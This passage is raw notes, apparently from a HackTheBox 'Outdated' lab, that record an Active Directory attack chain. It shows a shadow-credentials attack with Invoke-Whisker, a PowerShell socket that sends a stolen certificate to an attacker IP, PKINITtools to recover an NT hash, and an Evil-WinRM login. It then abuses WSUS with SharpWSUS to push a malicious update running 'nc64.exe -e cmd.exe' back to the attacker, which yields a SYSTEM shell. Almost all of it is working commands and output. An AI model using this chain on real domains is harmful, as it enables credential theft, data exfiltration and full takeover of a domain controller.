pQKrEwHMZwBtgO0W2sDJPb+TgUS0WcILDmDOzC7by7l/t3HfPm3Q4zTiVvUT97s2sBN7VUS3QGO9diZrhzPDJzdryd8EEkLrw1NG0v/YGfXGhrshoWvC7p3FVcOoCkjZyzCqiwUYP8SmWfuqJsY3W4x6B4gzF9wbct2alN3xqKYPE3yj9cDPWHQI6NIEwGZZfaOWHcStxZ3MeiZgJskgTuxWY8LHmJdUnpCYdAAw0hpvk1pUBX1qyafNhB2M0fj7hU6ZJUeMEdSw0f9WFCerHzJ/h/VPwMb2AunsFTg6WrJMjNvLS5VoUG1Ef+AkGpfMKEsRzrLf5x9oaTGo+/oA6nNSJvWp7D3buQdzNZ/KnjSh7iJtor9GynKa0sNM8HW4gwPGRwX+ImTK6tLAdER6dwcJAuraLMQ62G/rP23eD74QRH5/ehZHRuGHgK0I3oSSZ+bB5kc3p7qD/LGw5S8xf5Oizbjh9HiNR+CzGIDqfMJszds0rE0yswUARqD8u5F3LMBgfMNv1ErDnfyEqLcUH/91Gd/PDkYLSRyGZWy9gEANNChdDRHL+X37fXzA7MB8wBwYFKw4DAhoEFBF7Zd6ViSdnAcaVwvJ77yb+4OJZBBRFo9awLtLa7V+7fhpuVuCLfbIDOwICB9A= /password:"j2fSqqWwDeWr1cV2" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+
+...
+
+
+
+PS C:\Users\Public> Invoke-Whisker -command "add /target:sflowers /path:C:\Users\Public\sflowers.pfx /password:nnRJZliyhUWxHEFZ"
+Invoke-Whisker -command "add /target:sflowers /path:C:\Users\Public\sflowers.pfx /password:nnRJZliyhUWxHEFZ"
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID f80cd32b-e13a-4f4e-badb-8a0c20abf882
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Saving the associated certificate to file...
+[*] The associated certificate was saved to C:\Users\Public\sflowers.pfx
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:sflowers /certificate:C:\Users\Public\sflowers.pfx /password:"nnRJZliyhUWxHEFZ" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+
+PS C:\Users\Public> $client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',9002)
+$stream = $client.GetStream()
+$bytes = [System.IO.File]::ReadAllBytes('C:\Users\Public\sflowers.pfx')
+$stream.Write($bytes,0,$bytes.Length)
+$stream.Close(); $client.Close()$client = New-Object System.Net.Sockets.TCPClient('10.10.14.9',9002)
+PS C:\Users\Public> $stream = $client.GetStream()
+PS C:\Users\Public> $bytes = [System.IO.File]::ReadAllBytes('C:\Users\Public\sflowers.pfx')
+PS C:\Users\Public> $stream.Write($bytes,0,$bytes.Length)
+PS C:\Users\Public> 
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# git clone https://github.com/dirkjanm/PKINITtools.git
+cd PKINITtools
+┌──(root㉿kali)-[/home/kali/PKINITtools]
+└─# python3 -m venv ~/pkinit-venv
+source ~/pkinit-venv/bin/activate
+pip install -r requirements.txt
+
+
+
+┌──(pkinit-venv)─(root㉿kali)-[/home/kali/PKINITtools]
+└─# ntpdate 10.10.11.175;python3 gettgtpkinit.py -cert-pfx ../sflowers.pfx -pfx-pass nnRJZliyhUWxHEFZ outdated.htb/sflowers sflowers.ccache
+2025-10-14 18:10:56.050785 (-0400) +25230.429877 +/- 0.014271 10.10.11.175 s1 no-leap
+CLOCK: time stepped by 25230.429877
+2025-10-14 18:10:56,213 minikerberos INFO     Loading certificate and key from file
+2025-10-14 18:10:56,232 minikerberos INFO     Requesting TGT
+2025-10-14 11:10:39,372 minikerberos INFO     AS-REP encryption key (you might need this later):
+2025-10-14 11:10:39,372 minikerberos INFO     db7dd004998213b78f153e9ef922c0f60f5eedca953a4f312894413ac43be2ad
+2025-10-14 11:10:39,379 minikerberos INFO     Saved TGT to file
+                                                                                                                    
+┌──(pkinit-venv)─(root㉿kali)-[/home/kali/PKINITtools]
+
+┌──(pkinit-venv)─(root㉿kali)-[/home/kali/PKINITtools]
+└─# export KRB5CCNAME=$(pwd)/sflowers.ccache
+python3 getnthash.py -key db7dd004998213b78f153e9ef922c0f60f5eedca953a4f312894413ac43be2ad outdated.htb/sflowers
+/root/pkinit-venv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Using TGT from cache
+[*] Requesting ticket to self with PAC
+Recovered NT Hash
+1fcdb1f6015dcb318cc77bb2bda14db5
+                                                                                                                    
+┌──(pkinit-venv)─(root㉿kali)-[/home/kali/PKINITtools]
+└─# 
+
+┌──(pkinit-venv)─(root㉿kali)-[/home/kali/PKINITtools]
+└─# evil-winrm -i 10.10.11.175 -u sflowers -H 1fcdb1f6015dcb318cc77bb2bda14db5 
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sflowers\Documents> 
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name         SID
+================= ============================================
+outdated\sflowers S-1-5-21-4089647348-67660539-4016542185-1108
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                          Attributes
+=========================================== ================ ============================================ ===============================================================
+Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+OUTDATED\WSUS Administrators                Alias            S-1-5-21-4089647348-67660539-4016542185-1000 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+We are apart of the WSUS group
+
+
+https://www.lrqa.com/en/cyber-labs/introducing-sharpwsus/
+"Locating the WSUS server
+
+The WSUS server that a client is using can be found by querying the following registry key:
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate"
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> Get-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate' | Select-Object -Property WUServer
+
+WUServer
+--------
+http://wsus.outdated.htb:8530
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> Get-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate'
+
+
+SetActiveHours                               : 1
+ActiveHoursStart                             : 0
+ActiveHoursEnd                               : 23
+AcceptTrustedPublisherCerts                  : 1
+ExcludeWUDriversInQualityUpdate              : 1
+DoNotConnectToWindowsUpdateInternetLocations : 1
+WUServer                                     : http://wsus.outdated.htb:8530
+WUStatusServer                               : http://wsus.outdated.htb:8530
+UpdateServiceUrlAlternate                    :
+PSPath                                       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+PSParentPath                                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows
+PSChildName                                  : WindowsUpdate
+PSDrive                                      : HKLM
+PSProvider                                   : Microsoft.PowerShell.Core\Registry
+
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
+    SetActiveHours    REG_DWORD    0x1
+    ActiveHoursStart    REG_DWORD    0x0
+    ActiveHoursEnd    REG_DWORD    0x17
+    AcceptTrustedPublisherCerts    REG_DWORD    0x1
+    ExcludeWUDriversInQualityUpdate    REG_DWORD    0x1
+    DoNotConnectToWindowsUpdateInternetLocations    REG_DWORD    0x1
+    WUServer    REG_SZ    http://wsus.outdated.htb:8530
+    WUStatusServer    REG_SZ    http://wsus.outdated.htb:8530
+    UpdateServiceUrlAlternate    REG_SZ
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> 
+
+
+
+"We can see the server running on non-SSL HTTP, under the domain wsus.outdated.htb . We then query
+the subsequent registry key returned by our initial query, to check whether UseWUServer is set to 1 and
+verify that the service is in fact active."
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU
+    AutoInstallMinorUpdates    REG_DWORD    0x1
+    NoAutoUpdate    REG_DWORD    0x0
+    AUOptions    REG_DWORD    0x3
+    ScheduledInstallDay    REG_DWORD    0x0
+    ScheduledInstallTime    REG_DWORD    0x3
+    ScheduledInstallEveryWeek    REG_DWORD    0x1
+    UseWUServer    REG_DWORD    0x1
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate\AU\NoAutoUpdate
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> 
+
+"known WSUS exploitation techniques (SharpWSUS, WSUXploit, or manual update abuse)."
+
+"With that in mind, we will now attempt to attack this service using SharpWSUS , which will leverage this
+group membership to inject a malicious WSUS update. Conveniently, the tool is also hosted in the
+aforementioned PowerSharpPack repository, saving us the trouble of having to compile it ourselves on a
+Windows system. The file Invoke-SharpWSUS.ps1 entails a Base64 -encoded string, which is the
+compressed pre-compiled binary. Therefore, all we have to do is extract the string into a file, decode it into a
+new file, and then unzip the latter:"
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> certutil -decode asd asd.gz
+Input Length = 20465
+Output Length = 15346
+CertUtil: -decode command completed successfully.
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> $in = [IO.File]::OpenRead("C:\Users\sflowers\Desktop\asd.gz")
+$out = [IO.File]::Create("C:\Users\sflowers\Desktop\SharpWSUS.exe")
+$gz = New-Object IO.Compression.GzipStream($in, [IO.Compression.CompressionMode]::Decompress)
+$gz.CopyTo($out)
+$gz.Close()
+$in.Close()
+$out.Close()
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> 
+
+
+we are given PsExec64 on the desktop.
+
+WSUS updates often run as SYSTEM, but may require a payload that spawns a process as SYSTEM and interacts with the desktop/session.
+PsExec64.exe is a trusted Microsoft Sysinternals tool that can launch another executable as SYSTEM, bypassing restrictions that may prevent direct execution of your reverse shell.
+Some environments block or sandbox direct reverse shell binaries, but allow PsExec to run and spawn a child process.
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> $env:PROCESSOR_ARCHITECTURE
+AMD64
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> .\SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.9 9001" /title:"rootshell"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Create Update
+[*] Creating patch to use the following:
+[*] Payload: PsExec64.exe
+[*] Payload Path: C:\users\sflowers\Desktop\PsExec64.exe
+[*] Arguments: -accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.9 9001
+[*] Arguments (HTML Encoded): -accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.9 9001
+
+################# WSUS Server Enumeration via SQL ##################
+ServerName, WSUSPortNumber, WSUSContentLocation
+-----------------------------------------------
+DC, 8530, c:\WSUS\WsusContent
+
+ImportUpdate
+Update Revision ID: 38
+PrepareXMLtoClient
+InjectURL2Download
+DeploymentRevision
+PrepareBundle
+PrepareBundle Revision ID: 39
+PrepareXMLBundletoClient
+DeploymentRevision
+
+[*] Update created - When ready to deploy use the following command:
+[*] SharpWSUS.exe approve /updateid:6405b346-9ee5-4d55-995c-41571a07a240 /computername:Target.FQDN /groupname:"Group Name"
+
+[*] To check on the update status use the following command:
+[*] SharpWSUS.exe check /updateid:6405b346-9ee5-4d55-995c-41571a07a240 /computername:Target.FQDN
+
+[*] To delete the update use the following command:
+[*] SharpWSUS.exe delete /updateid:6405b346-9ee5-4d55-995c-41571a07a240 /computername:Target.FQDN /groupname:"Group Name"
+
+[*] Create complete
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> .\SharpWSUS.exe approve /updateid:6405b346-9ee5-4d55-995c-41571a07a240 /computername:dc.outdated.htb /groupname:"rootshell"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Approve Update
+
+Targeting dc.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+Group Exists = False
+Group Created: rootshell
+Added Computer To Group
+Approved Update
+
+[*] Approve complete
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> 
+
+
+
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> .\SharpWSUS.exe check /updateid:6405b346-9ee5-4d55-995c-41571a07a240 /computername:dc.outdated.htb
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Check Update
+
+Targeting dc.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+
+[*] Update is not installed
+
+[*] Check complete
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> 
+
+
+
+SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.49 9001" /title:"pwned"
+
+
+
+
+
+
+
+the update never came. I return after a long time...
+
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> .\SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"-accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.49 9001" /title:"pwned"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Create Update
+[*] Creating patch to use the following:
+[*] Payload: PsExec64.exe
+[*] Payload Path: C:\users\sflowers\Desktop\PsExec64.exe
+[*] Arguments: -accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.49 9001
+[*] Arguments (HTML Encoded): -accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.14.49 9001
+
+################# WSUS Server Enumeration via SQL ##################
+ServerName, WSUSPortNumber, WSUSContentLocation
+-----------------------------------------------
+DC, 8530, c:\WSUS\WsusContent
+
+ImportUpdate
+Update Revision ID: 30
+PrepareXMLtoClient
+InjectURL2Download
+DeploymentRevision
+PrepareBundle
+PrepareBundle Revision ID: 31
+PrepareXMLBundletoClient
+DeploymentRevision
+
+[*] Update created - When ready to deploy use the following command:
+[*] SharpWSUS.exe approve /updateid:7c80c60c-6813-4274-9f9c-b9397dad83a3 /computername:Target.FQDN /groupname:"Group Name"
+
+[*] To check on the update status use the following command:
+[*] SharpWSUS.exe check /updateid:7c80c60c-6813-4274-9f9c-b9397dad83a3 /computername:Target.FQDN
+
+[*] To delete the update use the following command:
+[*] SharpWSUS.exe delete /updateid:7c80c60c-6813-4274-9f9c-b9397dad83a3 /computername:Target.FQDN /groupname:"Group Name"
+
+[*] Create complete
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> .\SharpWSUS.exe approve /updateid:7c80c60c-6813-4274-9f9c-b9397dad83a3 /computername:dc.outdated.htb /groupname:"pwned"
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Approve Update
+
+Targeting dc.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+Group Exists = False
+Group Created: pwned
+Added Computer To Group
+Approved Update
+
+[*] Approve complete
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> .\SharpWSUS.exe check /updateid:7c80c60c-6813-4274-9f9c-b9397dad83a3 /computername:dc.outdated.htb
+
+ ____  _                   __        ______  _   _ ____
+/ ___|| |__   __ _ _ __ _ _\ \      / / ___|| | | / ___|
+\___ \| '_ \ / _` | '__| '_ \ \ /\ / /\___ \| | | \___ \
+ ___) | | | | (_| | |  | |_) \ V  V /  ___) | |_| |___) |
+|____/|_| |_|\__,_|_|  | .__/ \_/\_/  |____/ \___/|____/
+                       |_|
+           Phil Keeble @ Nettitude Red Team
+
+[*] Action: Check Update
+
+Targeting dc.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+
+[*] Update is not installed
+
+[*] Check complete
+
+*Evil-WinRM* PS C:\Users\sflowers\Desktop> 
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 9001            
+listening on [any] 9001 ...
+connect to [10.10.14.49] from (UNKNOWN) [10.10.11.175] 61170
+Microsoft Windows [Version 10.0.17763.1432]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd ../..
+cd ../..
+
+C:\>cd Users/Administrator/Desktop
+cd Users/Administrator/Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 2170-25D8
+
+ Directory of C:\Users\Administrator\Desktop
+
+08/13/2022  08:40 PM    <DIR>          .
+08/13/2022  08:40 PM    <DIR>          ..
+11/11/2025  07:46 AM                34 root.txt
+
